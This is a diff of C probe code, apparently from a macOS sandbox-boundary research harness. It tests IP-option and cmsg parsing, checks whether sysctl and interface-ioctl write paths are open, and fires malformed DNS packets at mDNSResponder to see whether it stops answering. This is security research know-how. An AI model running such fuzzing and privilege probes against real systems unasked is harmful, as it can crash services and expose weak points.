+                // so ip_output/ip_forward walks the option bytes.
+                struct sockaddr_in d = {0};
+                d.sin_len = sizeof(d); d.sin_family = AF_INET;
+                d.sin_port = htons(1); d.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+                ssize_t sd = sendto(s, "opt", 3, 0, (struct sockaddr *)&d, sizeof(d));
+                LOG("[net6]   egress with accepted options -> send %zd errno %d", sd,
+                    sd < 0 ? errno : 0);
+                // and re-read them back through getsockopt: round-trip proof
+                uint8_t back[40];
+                socklen_t bl = sizeof(back);
+                int grc = getsockopt(s, IPPROTO_IP, IP_OPTIONS, back, &bl);
+                LOG("[net6]   getsockopt IP_OPTIONS -> rc %d len %u bytes "
+                    "%02x %02x %02x %02x", grc, (unsigned)bl, back[0], back[1],
+                    back[2], back[3]);
+            }
+            fsync(fileno(stderr));
+        }
+        close(s);
+    }
+
+    // ---- sendmsg cmsg: the second options parser. The listener only proves
+    // delivery; the datum is the sendmsg errno, which is where the cmsg
+    // validator answers.
+    {
+        int l4 = socket(AF_INET, SOCK_DGRAM, 0);
+        // Ask the kernel to hand back whatever IP options it found on the
+        // arriving datagram. If our IP_RETOPTS cmsg survived the output path,
+        // the option bytes show up here — that is the difference between
+        // "sendmsg accepted the cmsg" and "the kernel's option parser ran".
+        int one = 1;
+        int ro1 = setsockopt(l4, IPPROTO_IP, IP_RECVOPTS, &one, sizeof(one));
+        int e1 = ro1 < 0 ? errno : 0;
+        int ro2 = setsockopt(l4, IPPROTO_IP, IP_RECVRETOPTS, &one, sizeof(one));
+        int e2 = ro2 < 0 ? errno : 0;
+        LOG("[net6] listener IP_RECVOPTS rc %d errno %d, IP_RECVRETOPTS rc %d errno %d",
+            ro1, e1, ro2, e2);
+        struct sockaddr_in la = {0};
+        la.sin_len = sizeof(la); la.sin_family = AF_INET;
+        la.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+        bind(l4, (struct sockaddr *)&la, sizeof(la));
+        socklen_t sl = sizeof(la);
+        getsockname(l4, (struct sockaddr *)&la, &sl);
+        struct sockaddr_in dst = la;
+        struct timeval tv = {0, 250000};
+        setsockopt(l4, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+
+        int tx = socket(AF_INET, SOCK_DGRAM, 0);
+        struct iovec iov;
+        char payload[] = "cmsg";
+        iov.iov_base = payload; iov.iov_len = sizeof(payload) - 1;
+
+        // 1. IP_PKTINFO with an ifindex that cannot exist
+        {
+            uint8_t cbuf[CMSG_SPACE(sizeof(struct in_pktinfo))];
+            struct msghdr mh = {0};
+            mh.msg_name = &dst; mh.msg_namelen = sizeof(dst);
+            mh.msg_iov = &iov; mh.msg_iovlen = 1;
+            mh.msg_control = cbuf; mh.msg_controllen = sizeof(cbuf);
+            struct cmsghdr *cm = CMSG_FIRSTHDR(&mh);
+            cm->cmsg_level = IPPROTO_IP; cm->cmsg_type = IP_PKTINFO;
+            cm->cmsg_len = CMSG_LEN(sizeof(struct in_pktinfo));
+            struct in_pktinfo pi;
+            memset(&pi, 0, sizeof(pi));
+            pi.ipi_ifindex = 0x7fffffff;
+            pi.ipi_spec_dst.s_addr = htonl(0x7f0000ff);
+            memcpy(CMSG_DATA(cm), &pi, sizeof(pi));
+            ssize_t r = sendmsg(tx, &mh, 0);
+            LOG("[net6] sendmsg IP_PKTINFO ifindex=0x7fffffff -> %zd errno %d", r,
+                r < 0 ? errno : 0);
+        }
+        // 2. IP_RETOPTS via cmsg — the §165 question asked through the other
+        // parser: setsockopt(IP_OPTIONS) said EINVAL, does cmsg say the same?
+        {
+            uint8_t opts[8] = { 0x83, 0x07, 0x04, 0x7f, 0x00, 0x00, 0x01, 0x00 }; // LSRR-ish
+            uint8_t cbuf[CMSG_SPACE(sizeof(opts))];
+            struct msghdr mh = {0};
+            mh.msg_name = &dst; mh.msg_namelen = sizeof(dst);
+            mh.msg_iov = &iov; mh.msg_iovlen = 1;
+            mh.msg_control = cbuf; mh.msg_controllen = sizeof(cbuf);
+            struct cmsghdr *cm = CMSG_FIRSTHDR(&mh);
+            cm->cmsg_level = IPPROTO_IP; cm->cmsg_type = IP_RETOPTS;
+            cm->cmsg_len = CMSG_LEN(sizeof(opts));
+            memcpy(CMSG_DATA(cm), opts, sizeof(opts));
+            ssize_t r = sendmsg(tx, &mh, 0);
+            LOG("[net6] sendmsg IP_RETOPTS (8B LSRR-ish) -> %zd errno %d  "
+                "(§165 setsockopt said EINVAL)", r, r < 0 ? errno : 0);
+        }
+        // 3. hop-by-hop options as a cmsg on an IPv4 socket — level/type
+        // confusion is its own class of validation bug.
+        {
+            uint8_t cbuf[CMSG_SPACE(8)];
+            struct msghdr mh = {0};
+            mh.msg_name = &dst; mh.msg_namelen = sizeof(dst);
+            mh.msg_iov = &iov; mh.msg_iovlen = 1;
+            mh.msg_control = cbuf; mh.msg_controllen = sizeof(cbuf);
+            struct cmsghdr *cm = CMSG_FIRSTHDR(&mh);
+            cm->cmsg_level = IPPROTO_IPV6; cm->cmsg_type = IPV6_2292HOPOPTS;
+            cm->cmsg_len = CMSG_LEN(8);
+            memset(CMSG_DATA(cm), 0, 8);
+            ssize_t r = sendmsg(tx, &mh, 0);
+            LOG("[net6] sendmsg v6-HOPOPTS cmsg on v4 socket -> %zd errno %d", r,
+                r < 0 ? errno : 0);
+        }
+        // Did anything still arrive? Delivery after a refused cmsg would be
+        // the kernel having ignored the refusal, which is worth knowing. And
+        // recvmsg (not recv) so the cmsg chain is visible: an IP_RETOPTS
+        // record here means our option bytes were parsed on output AND
+        // delivered — the full §165 question answered.
+        char rb[64];
+        char cbuf[512];
+        struct msghdr rmh = {0};
+        struct iovec riov;
+        riov.iov_base = rb; riov.iov_len = sizeof(rb);
+        rmh.msg_iov = &riov; rmh.msg_iovlen = 1;
+        rmh.msg_control = cbuf; rmh.msg_controllen = sizeof(cbuf);
+        ssize_t rd = recvmsg(l4, &rmh, 0);
+        LOG("[net6] listener recvmsg after cmsg batch -> %zd, controllen %zu", rd,
+            (size_t)rmh.msg_controllen);
+        for (struct cmsghdr *cm = CMSG_FIRSTHDR(&rmh); cm;
+             cm = CMSG_NXTHDR(&rmh, cm)) {
+            LOG("[net6]   recv cmsg level %d type %d len %zu", cm->cmsg_level,
+                cm->cmsg_type, (size_t)cm->cmsg_len);
+            if (cm->cmsg_level == IPPROTO_IP &&
+                (cm->cmsg_type == IP_RETOPTS || cm->cmsg_type == IP_OPTIONS)) {
+                unsigned char *o = (unsigned char *)CMSG_DATA(cm);
+                LOG("[net6]   *** OPTION BYTES RETURNED: %02x %02x %02x %02x "
+                    "(sent were 83 07 04 7f...) ***", o[0], o[1], o[2], o[3]);
+            }
+        }
+        close(tx); close(l4);
+        fsync(fileno(stderr));
+    }
+
+    // ---- sysctl writes: read first (control), then write the same value
+    // back (test). Same-value writes make success side-effect-free, so a
+    // rc=0 means the write path is open with nothing changed.
+    {
+        static const char *names[] = {
+            "net.inet.ip.ttl", "net.inet6.ip6.hoplimit", "net.inet.ip.mtudisc",
+            "net.inet.tcp.sendspace", "net.inet.tcp.recvspace",
+            "net.inet.udp.recvspace", "net.inet.udp.maxdgram",
+            "net.inet.icmp.icmplim", "kern.maxfiles", "kern.maxproc",
+            "kern.ipc.maxsockbuf", "kern.ipc.somaxconn",
+            "net.inet.ip.forwarding", "net.inet6.ip6.forwarding",
+            "net.inet.tcp.sendspace", "kern.securelevel",
+        };
+        int mib[CTL_MAXNAME];
+        for (unsigned i = 0; i < sizeof(names) / sizeof(names[0]); i++) {
+            size_t ml = CTL_MAXNAME;
+            if (sysctlnametomib(names[i], mib, &ml) != 0) {
+                LOG("[net6] sysctl %-26s nametomib errno %d", names[i], errno);
+                continue;
+            }
+            int val = 0;
+            size_t vl = sizeof(val);
+            int rcr = sysctl(mib, (u_int)ml, &val, &vl, NULL, 0);
+            int er = rcr < 0 ? errno : 0;
+            if (rcr != 0) {
+                LOG("[net6] sysctl %-26s READ rc %d errno %d — write not attempted "
+                    "(read is the control)", names[i], rcr, er);
+                continue;
+            }
+            int rcw = sysctl(mib, (u_int)ml, NULL, NULL, &val, sizeof(val));
+            int ew = rcw < 0 ? errno : 0;
+            LOG("[net6] sysctl %-26s read=%d write(same) rc %d errno %d%s", names[i],
+                val, rcw, ew, rcw == 0 ? "  *** WRITE PATH OPEN ***" : "");
+            fsync(fileno(stderr));
+        }
+    }
+
+    // ---- ioctl: same read-then-write-same-value pattern. SIOCSIFADDR goes
+    // against an interface name that cannot exist, so the errno ordering
+    // itself is the datum: EPERM before ENXIO means policy answers first.
+    {
+        int s = socket(AF_INET, SOCK_DGRAM, 0);
+        struct ifreq ifr;
+        memset(&ifr, 0, sizeof(ifr));
+        strcpy(ifr.ifr_name, "lo0");
+        int rc = ioctl(s, SIOCGIFADDR, &ifr);
+        LOG("[net6] CONTROL SIOCGIFADDR lo0 -> rc %d errno %d", rc, rc < 0 ? errno : 0);
+        memset(&ifr, 0, sizeof(ifr));
+        strcpy(ifr.ifr_name, "lo0");
+        rc = ioctl(s, SIOCGIFMTU, &ifr);
+        int mtu = ifr.ifr_mtu;
+        LOG("[net6] CONTROL SIOCGIFMTU  lo0 -> rc %d mtu %d errno %d", rc, mtu,
+            rc < 0 ? errno : 0);
+        if (rc == 0) {
+            memset(&ifr, 0, sizeof(ifr));
+            strcpy(ifr.ifr_name, "lo0");
+            ifr.ifr_mtu = mtu;
+            rc = ioctl(s, SIOCSIFMTU, &ifr);
+            LOG("[net6] SIOCSIFMTU lo0 (same value) -> rc %d errno %d%s", rc,
+                rc < 0 ? errno : 0, rc == 0 ? "  *** WRITE PATH OPEN ***" : "");
+        }
+        memset(&ifr, 0, sizeof(ifr));
+        strcpy(ifr.ifr_name, "lo0");
+        rc = ioctl(s, SIOCGIFFLAGS, &ifr);
+        short fl = ifr.ifr_flags;
+        LOG("[net6] CONTROL SIOCGIFFLAGS lo0 -> rc %d flags 0x%x errno %d", rc, fl,
+            rc < 0 ? errno : 0);
+        if (rc == 0) {
+            memset(&ifr, 0, sizeof(ifr));
+            strcpy(ifr.ifr_name, "lo0");
+            ifr.ifr_flags = fl;
+            rc = ioctl(s, SIOCSIFFLAGS, &ifr);
+            LOG("[net6] SIOCSIFFLAGS lo0 (same value) -> rc %d errno %d%s", rc,
+                rc < 0 ? errno : 0, rc == 0 ? "  *** WRITE PATH OPEN ***" : "");
+        }
+        memset(&ifr, 0, sizeof(ifr));
+        strcpy(ifr.ifr_name, "fz0"); // cannot exist: ordering probe
+        rc = ioctl(s, SIOCSIFADDR, &ifr);
+        LOG("[net6] SIOCSIFADDR on nonexistent iface -> rc %d errno %d "
+            "(EPERM=1 before ENXIO=6 means policy answers first)", rc,
+            rc < 0 ? errno : 0);
+        // interface list read: a denominator for which ifnets exist at all
+        {
+            int n = 32;
+            struct ifconf ifc;
+            char buf[4096];
+            ifc.ifc_len = sizeof(buf); ifc.ifc_buf = buf;
+            rc = ioctl(s, SIOCGIFCONF, &ifc);
+            LOG("[net6] SIOCGIFCONF -> rc %d len %d errno %d", rc, ifc.ifc_len,
+                rc < 0 ? errno : 0);
+            if (rc == 0) {
+                n = ifc.ifc_len / (int)sizeof(struct ifreq);
+                for (int i = 0; i < n && i < 32; i++) {
+                    struct ifreq *r = &ifc.ifc_req[i];
+                    LOG("[net6]   ifnet[%d] %s", i, r->ifr_name);
+                }
+            }
+        }
+        close(s);
+        fsync(fileno(stderr));
+    }
+    LOG("[net6] all probes completed, process still alive");
+    LOG("[net6] done");
+}
+
+// ---------------------------------------------------------------------------
+// V171 (p_mdns): privileged daemons on loopback, asked in their own dialect.
+//
+// §146 closed the Mach route to every privileged daemon (0 of 132) and the
+// IOKit route closed earlier (5 of 460, all gated). One route has not been
+// measured at all: the daemons' *network* listeners. p_lsvc (§164, log now
+// captured) probed 66 TCP/UDP ports and found exactly one open — TCP 1080 —
+// with zero UDP replies, but its UDP probe was one well-formed DNS packet to
+// 127.0.0.1:5353 only, and mDNSResponder answers on multicast addresses, not
+// necessarily on loopback unicast. "Nobody answered one packet on one
+// address" is precisely the kind of negative this project has repeatedly had
+// to retract (§144).
+//
+// So: enumerate interfaces first (control), prove our own send/receive path
+// works by echoing to ourselves (control), then ask mDNSResponder in every
+// way a real client would — unicast, per-interface multicast, IPv6 link-
+// local multicast — and only then, if it talks, throw malformed packets at
+// it with a control query before and after each one so a responder death is
+// observable rather than assumed. TCP 1080 gets a patient second look with
+// the same before/after discipline.
+// ---------------------------------------------------------------------------
+static void p_mdns(void) {
+    LOG("[mdns] v171 loopback daemons: mDNSResponder in dialect, patient 1080");
+
+    // ---- CONTROL: interfaces exist and our own packets round-trip.
+    struct ifaddrs *ifp = NULL;
+    int nif = 0;
+    if (getifaddrs(&ifp) != 0) {
+        LOG("[mdns] *** CONTROL FAILED: getifaddrs errno %d ***", errno);
+        LOG("[mdns] done");
+        return;
+    }
+    for (struct ifaddrs *p = ifp; p; p = p->ifa_next) {
+        if (!p->ifa_addr) continue;
+        int fam = p->ifa_addr->sa_family;
+        char ip[64] = "?";
+        if (fam == AF_INET)
+            inet_ntop(AF_INET, &((struct sockaddr_in *)p->ifa_addr)->sin_addr,
+                      ip, sizeof(ip));
+        else if (fam == AF_INET6)
+            inet_ntop(AF_INET6, &((struct sockaddr_in6 *)p->ifa_addr)->sin6_addr,
+                      ip, sizeof(ip));
+        else continue;
+        nif++;
+        LOG("[mdns]   ifnet %-8s flags 0x%x %s %s", p->ifa_name, p->ifa_flags,
+            (p->ifa_flags & IFF_UP) ? "UP" : "DOWN", ip);
+    }
+    fsync(fileno(stderr));
+
+    int ctl = socket(AF_INET, SOCK_DGRAM, 0);
+    struct sockaddr_in ca = {0};
+    ca.sin_len = sizeof(ca); ca.sin_family = AF_INET;
+    ca.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+    bind(ctl, (struct sockaddr *)&ca, sizeof(ca));
+    socklen_t cl = sizeof(ca);
+    getsockname(ctl, (struct sockaddr *)&ca, &cl);
+    struct sockaddr_in self = ca;
+    ssize_t ss = sendto(ctl, "ctl", 3, 0, (struct sockaddr *)&self, sizeof(self));
+    struct timeval tv = {0, 300000};
+    setsockopt(ctl, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+    char cb[8] = {0};
+    ssize_t sr = recv(ctl, cb, sizeof(cb), 0);
+    LOG("[mdns] CONTROL self round-trip send=%zd recv=%zd", ss, sr);
+    close(ctl);
+    if (sr != 3) {
+        LOG("[mdns] *** CONTROL FAILED — no UDP path at all, negatives below void ***");
+        fsync(fileno(stderr));
+    }
+
+    // mDNS meta-query: any conforming responder answers PTR for
+    // _services._dns-sd._udp.local. ID 0, flags 0 (mDNS, no recursion
+    // desired) — the shape that got no answer in §164 was RD=1 with a
+    // nonzero ID, which mDNSResponder is entitled to ignore.
+    static const uint8_t q_meta[] = {
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        8, '_','s','e','r','v','i','c','e','s',
+        7, '_','d','n','s','-','s','d',
+        4, '_','u','d','p',
+        5, 'l','o','c','a','l',
+        0x00,
+        0x00, 0x0c,  // PTR
+        0x00, 0x01,  // IN
+    };
+    // unicast DNS-flavoured variant for the same name
+    static const uint8_t q_unicast[] = {
+        0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        8, '_','s','e','r','v','i','c','e','s',
+        7, '_','d','n','s','-','s','d',
+        4, '_','u','d','p',
+        5, 'l','o','c','a','l',
+        0x00,
+        0x00, 0x0c,
+        0x00, 0x01,
+    };
+
+    // One receive socket shared by all the sends below.
+    int rx = socket(AF_INET, SOCK_DGRAM, 0);
+    struct sockaddr_in ra = {0};
+    ra.sin_len = sizeof(ra); ra.sin_family = AF_INET;
+    ra.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+    ra.sin_port = 0;
+    bind(rx, (struct sockaddr *)&ra, sizeof(ra));
+    socklen_t rl = sizeof(ra);
+    getsockname(rx, (struct sockaddr *)&ra, &rl);
+    struct timeval rtv = {0, 700000};
+    setsockopt(rx, SOL_SOCKET, SO_RCVTIMEO, &rtv, sizeof(rtv));
+
+    int talk = 0;
+
+    // ---- unicast to loopback
+    {
+        int tx = socket(AF_INET, SOCK_DGRAM, 0);
+        struct sockaddr_in d = {0};
+        d.sin_len = sizeof(d); d.sin_family = AF_INET;
+        d.sin_port = htons(5353);
+        d.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+        ssize_t s = sendto(tx, q_meta, sizeof(q_meta), 0,
+                           (struct sockaddr *)&d, sizeof(d));
+        char rb[512];
+        ssize_t r = recv(rx, rb, sizeof(rb), 0);
+        LOG("[mdns] unicast 127.0.0.1:5353 mDNS meta-query -> send %zd recv %zd errno %d",
+            s, r, r < 0 ? errno : 0);
+        if (r > 0) {
+            talk++;
+            LOG("[mdns]   REPLY %zd bytes: %02x %02x %02x %02x %02x %02x %02x %02x",
+                r, rb[0], rb[1], rb[2], rb[3], rb[4], rb[5], rb[6], rb[7]);
+        }
+        s = sendto(tx, q_unicast, sizeof(q_unicast), 0,
+                   (struct sockaddr *)&d, sizeof(d));
+        r = recv(rx, rb, sizeof(rb), 0);
+        LOG("[mdns] unicast 127.0.0.1:5353 DNS-flavoured (id 0x1234 RD) -> send %zd "
+            "recv %zd errno %d", s, r, r < 0 ? errno : 0);
+        if (r > 0) {
+            talk++;
+            LOG("[mdns]   REPLY %zd bytes", r);
+        }
+        close(tx);
+        fsync(fileno(stderr));
+    }
+
+    // ---- multicast per interface: v4 224.0.0.251, v6 ff02::fb. §163's
+    // multicast attempt failed with errno 65 because no interface was
+    // selected; IP_MULTICAST_IF is that selection.
+    for (struct ifaddrs *p = ifp; p; p = p->ifa_next) {
+        if (!p->ifa_addr || !(p->ifa_flags & IFF_UP)) continue;
+        if (p->ifa_addr->sa_family == AF_INET) {
+            int tx = socket(AF_INET, SOCK_DGRAM, 0);
+            struct in_addr ifaddr =
+                ((struct sockaddr_in *)p->ifa_addr)->sin_addr;
+            int r1 = setsockopt(tx, IPPROTO_IP, IP_MULTICAST_IF, &ifaddr,
+                                sizeof(ifaddr));
+            unsigned char loop = 1;
+            setsockopt(tx, IPPROTO_IP, IP_MULTICAST_LOOP, &loop, sizeof(loop));
+            struct sockaddr_in d = {0};
+            d.sin_len = sizeof(d); d.sin_family = AF_INET;
+            d.sin_port = htons(5353);
+            d.sin_addr.s_addr = htonl(0xE00000FB); // 224.0.0.251
+            ssize_t s = sendto(tx, q_meta, sizeof(q_meta), 0,
+                               (struct sockaddr *)&d, sizeof(d));
+            int se = s < 0 ? errno : 0;   // capture BEFORE recv clobbers errno
+            char rb[512];
+            ssize_t r = recv(rx, rb, sizeof(rb), 0);
+            LOG("[mdns] mcast 224.0.0.251:5353 via %s (if=%d) -> setif %d send %zd "
+                "err %d recv %zd err %d", p->ifa_name, r1, r1, s, se, r,
+                r < 0 ? errno : 0);
+            if (r > 0) {
+                talk++;
+                LOG("[mdns]   REPLY %zd bytes via %s", r, p->ifa_name);
+            }
+            close(tx);
+        } else if (p->ifa_addr->sa_family == AF_INET6) {
+            struct sockaddr_in6 *a6 = (struct sockaddr_in6 *)p->ifa_addr;
+            if (IN6_IS_ADDR_LINKLOCAL(&a6->sin6_addr)) continue; // ff02 uses scope
+            int tx = socket(AF_INET6, SOCK_DGRAM, 0);
+            unsigned int ifx = if_nametoindex(p->ifa_name);
+            int r1 = setsockopt(tx, IPPROTO_IPV6, IPV6_MULTICAST_IF, &ifx,
+                                sizeof(ifx));
+            struct sockaddr_in6 d = {0};
+            d.sin6_len = sizeof(d); d.sin6_family = AF_INET6;
+            d.sin6_port = htons(5353);
+            d.sin6_scope_id = ifx;
+            inet_pton(AF_INET6, "ff02::fb", &d.sin6_addr);
+            ssize_t s = sendto(tx, q_meta, sizeof(q_meta), 0,
+                               (struct sockaddr *)&d, sizeof(d));
+            int se = s < 0 ? errno : 0;   // capture BEFORE recv clobbers errno
+            char rb[512];
+            ssize_t r = recv(rx, rb, sizeof(rb), 0);
+            LOG("[mdns] mcast ff02::fb:5353 via %s (if=%u) -> setif %d send %zd "
+                "err %d recv %zd err %d", p->ifa_name, ifx, r1, s, se, r,
+                r < 0 ? errno : 0);
+            if (r > 0) {
+                talk++;
+                LOG("[mdns]   REPLY %zd bytes via %s (v6)", r, p->ifa_name);
+            }
+            close(tx);
+        }
+        fsync(fileno(stderr));
+    }
+
+    LOG("[mdns] reached: %d of %d probe kinds got a reply%s", talk, 3,
+        talk == 0 ? "  — responder silent on every address; the §164 negative "
+                     "holds for these shapes too" : "");
+
+    // ---- Only if it talks: malformed packets, each bracketed by a control
+    // query so "the responder died" is an observation, not a guess (§144).
+    if (talk > 0) {
+        int tx = socket(AF_INET, SOCK_DGRAM, 0);
+        struct sockaddr_in d = {0};
+        d.sin_len = sizeof(d); d.sin_family = AF_INET;
+        d.sin_port = htons(5353);
+        d.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+        char rb[512];
+
+        struct { const char *what; const uint8_t *b; size_t n; } bad[4];
+        static const uint8_t m_label[] = { 0,0, 0,0, 0,1, 0,0, 0,0, 0,0,
+                                           0x40, 'a','b','c', 0, 0,0,12, 0,1 };
+        static const uint8_t m_ptr[] = { 0,0, 0,0, 0,1, 0,0, 0,0, 0,0,
+                                         0xc0, 0x0c, 0,0,12, 0,1 };
+        static const uint8_t m_qd[] = { 0,0, 0,0, 0xff, 0xff, 0,0, 0,0, 0,0 };
+        static const uint8_t m_trunc[] = { 0,0, 0,0, 0,1, 0 };
+        bad[0].what = "label type 0x40 (reserved)"; bad[0].b = m_label; bad[0].n = sizeof(m_label);
+        bad[1].what = "compression pointer loop (c00c->self)"; bad[1].b = m_ptr; bad[1].n = sizeof(m_ptr);
+        bad[2].what = "qdcount=0xffff, no records"; bad[2].b = m_qd; bad[2].n = sizeof(m_qd);
+        bad[3].what = "truncated at byte 7"; bad[3].b = m_trunc; bad[3].n = sizeof(m_trunc);
+
+        for (int i = 0; i < 4; i++) {
+            sendto(tx, q_meta, sizeof(q_meta), 0, (struct sockaddr *)&d, sizeof(d));
+            ssize_t pre = recv(rx, rb, sizeof(rb), 0);
+            sendto(tx, bad[i].b, bad[i].n, 0, (struct sockaddr *)&d, sizeof(d));
+            usleep(300000);
+            sendto(tx, q_meta, sizeof(q_meta), 0, (struct sockaddr *)&d, sizeof(d));
+            ssize_t post = recv(rx, rb, sizeof(rb), 0);
+            LOG("[mdns] malformed %-34s -> control before %zd, after %zd%s",
+                bad[i].what, pre, post,
+                (pre > 0 && post <= 0) ? "  *** RESPONDER STOPPED ANSWERING ***" : "");
+            fsync(fileno(stderr));
+        }
+        close(tx);
+    }
+
+    // ---- Detector repair before trusting any negative (§144): mDNS
+    // responders multicast their answers to 224.0.0.251:5353 / ff02::fb:5353,
+    // so a receiver bound to an ephemeral port can never see them. Bind to
+    // 5353 itself (SO_REUSEPORT lets us coexist with mDNSResponder) and join
+    // the group, then re-ask. Only a reply heard here can make the negatives
+    // above meaningful.
+    {
+        int rx5353 = socket(AF_INET, SOCK_DGRAM, 0);
+        int yes = 1;
+        setsockopt(rx5353, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
+        setsockopt(rx5353, SOL_SOCKET, SO_REUSEPORT, &yes, sizeof(yes));
+        struct sockaddr_in a = {0};
+        a.sin_len = sizeof(a); a.sin_family = AF_INET;
+        a.sin_port = htons(5353);
+        a.sin_addr.s_addr = htonl(INADDR_ANY);
+        int bb = bind(rx5353, (struct sockaddr *)&a, sizeof(a));
+        int be = bb < 0 ? errno : 0;
+        struct ip_mreq mg;
+        memset(&mg, 0, sizeof(mg));
+        mg.imr_multiaddr.s_addr = htonl(0xE00000FB);
+        mg.imr_interface.s_addr = htonl(INADDR_LOOPBACK);
+        int jr = setsockopt(rx5353, IPPROTO_IP, IP_ADD_MEMBERSHIP, &mg, sizeof(mg));
+        int je = jr < 0 ? errno : 0;
+        struct timeval tv2 = {1, 0};
+        setsockopt(rx5353, SOL_SOCKET, SO_RCVTIMEO, &tv2, sizeof(tv2));
+        LOG("[mdns] 5353-bound receiver: bind rc %d errno %d, join mcast rc %d errno %d",
+            bb, be, jr, je);
+
+        // Ask from the 5353-bound socket itself: whatever port the responder
+        // chooses for the reply — multicast group or our source port — this
+        // socket hears it. (Sending from a different socket, as the first
+        // batch did, loses unicast replies to a socket that never recvs.)
+        int tx = socket(AF_INET, SOCK_DGRAM, 0);
+        struct sockaddr_in d = {0};
+        d.sin_len = sizeof(d); d.sin_family = AF_INET;
+        d.sin_port = htons(5353);
+        d.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+        // Two response paths must both be covered (§144): RFC 6762 sends a
+        // legacy unicast reply to the querier's *source port* (tx, ephemeral),
+        // while an mDNS reply goes to the multicast group port 5353 (rx5353).
+        // The first batch only listened on one of them — that was a broken
+        // detector, not a silent responder. Send from tx, then poll BOTH.
+        struct timeval tv3 = {1, 0};
+        setsockopt(tx, SOL_SOCKET, SO_RCVTIMEO, &tv3, sizeof(tv3));
+        ssize_t s = sendto(tx, q_meta, sizeof(q_meta), 0,
+                           (struct sockaddr *)&d, sizeof(d));
+        char rb[512];
+        ssize_t r = recv(tx, rb, sizeof(rb), 0);
+        int from_src = r > 0;
+        if (r <= 0) {
+            r = recv(rx5353, rb, sizeof(rb), 0);
+            if (r > 0) LOG("[mdns]   reply arrived on the group socket, not source port");
+        }
+        LOG("[mdns] re-ask (source port + group socket both watched): send %zd "
+            "recv %zd errno %d%s", s, r, r < 0 ? errno : 0,
+            r > 0 ? "  *** RESPONDER ANSWERED ***" : "");
+        (void)from_src;
+        if (r > 0) {
+            talk++;
+            LOG("[mdns]   REPLY %zd bytes: %02x %02x %02x %02x %02x %02x %02x %02x",
+                r, rb[0], rb[1], rb[2], rb[3], rb[4], rb[5], rb[6], rb[7]);
+            fsync(fileno(stderr));
+            // Now the malformed batch is meaningful: bracket each with a
+            // control query through the receiver that provably hears answers.
+            static const uint8_t m_label[] = { 0,0, 0,0, 0,1, 0,0, 0,0, 0,0,
+                                               0x40, 'a','b','c', 0, 0,0,12, 0,1 };
+            static const uint8_t m_ptr[] = { 0,0, 0,0, 0,1, 0,0, 0,0, 0,0,
+                                             0xc0, 0x0c, 0,0,12, 0,1 };
+            static const uint8_t m_qd[] = { 0,0, 0,0, 0xff, 0xff, 0,0, 0,0, 0,0 };
+            static const uint8_t m_trunc[] = { 0,0, 0,0, 0,1, 0 };
+            struct { const char *what; const uint8_t *b; size_t n; } bad[4] = {
+                { "label type 0x40 (reserved)", m_label, sizeof(m_label) },
+                { "compression pointer loop (c00c->self)", m_ptr, sizeof(m_ptr) },
+                { "qdcount=0xffff, no records", m_qd, sizeof(m_qd) },
+                { "truncated at byte 7", m_trunc, sizeof(m_trunc) },
+            };
+            for (int i = 0; i < 4; i++) {
+                sendto(tx, q_meta, sizeof(q_meta), 0,
+                       (struct sockaddr *)&d, sizeof(d));
+                ssize_t pre = recv(tx, rb, sizeof(rb), 0);
+                if (pre <= 0) pre = recv(rx5353, rb, sizeof(rb), 0);
+                sendto(tx, bad[i].b, bad[i].n, 0, (struct sockaddr *)&d, sizeof(d));
+                usleep(300000);
+                sendto(tx, q_meta, sizeof(q_meta), 0,
+                       (struct sockaddr *)&d, sizeof(d));
+                ssize_t post = recv(tx, rb, sizeof(rb), 0);
+                if (post <= 0) post = recv(rx5353, rb, sizeof(rb), 0);
+                LOG("[mdns] malformed %-34s -> control before %zd, after %zd%s",
+                    bad[i].what, pre, post,
+                    (pre > 0 && post <= 0) ? "  *** RESPONDER STOPPED ANSWERING ***"
+                                           : "");
+                fsync(fileno(stderr));
+            }
+        } else {
+            LOG("[mdns] no answer even to a legal query through a receiver that "
+                "can hear the multicast group — §164 negative confirmed with a "
+                "detector that was proven to work");
+        }
+
+        // Two hypotheses left before the negative can be called closed:
+        // (a) mDNSResponder drops queries arriving from loopback (a real
+        //     filtering behaviour in some versions), (b) it only treats a
+        //     querier on port 5353 as a peer mDNS responder. Ask on the
+        //     real interface addresses, and ask with source port 5353.
+        for (int pass = 0; pass < 3 && talk == 0; pass++) {
+            const char *tgt = NULL;
+            struct in_addr t4 = {0};
+            if (pass == 0) { t4.s_addr = htonl(0xC0A84466); tgt = "192.168.68.102 (en0)"; }
+            if (pass == 1) { t4.s_addr = htonl(0xC0A8EA03); tgt = "192.168.234.3 (en2)"; }
+            int tx2 = socket(AF_INET, SOCK_DGRAM, 0);
+            // A blocking recv here hung the whole phase once already (the
+            // first run stalled at this loop): every wait gets a timeout.
+            struct timeval tv4 = {1, 0};
+            setsockopt(tx2, SOL_SOCKET, SO_RCVTIMEO, &tv4, sizeof(tv4));
+            if (pass < 2) {
+                struct sockaddr_in d2 = {0};
+                d2.sin_len = sizeof(d2); d2.sin_family = AF_INET;
+                d2.sin_port = htons(5353); d2.sin_addr = t4;
+                ssize_t s2 = sendto(tx2, q_meta, sizeof(q_meta), 0,
+                                    (struct sockaddr *)&d2, sizeof(d2));
+                int se2 = s2 < 0 ? errno : 0;
+                char rb2[512];
+                ssize_t r2 = recv(tx2, rb2, sizeof(rb2), 0);
+                LOG("[mdns] unicast to %s:5353 -> send %zd err %d recv %zd err %d%s",
+                    tgt, s2, se2, r2, r2 < 0 ? errno : 0,
+                    r2 > 0 ? "  *** RESPONDER ANSWERED OFF-LOOPBACK ***" : "");
+            } else {
+                // source port 5353: peer-responder framing
+                int yes2 = 1;
+                setsockopt(tx2, SOL_SOCKET, SO_REUSEADDR, &yes2, sizeof(yes2));
+                setsockopt(tx2, SOL_SOCKET, SO_REUSEPORT, &yes2, sizeof(yes2));
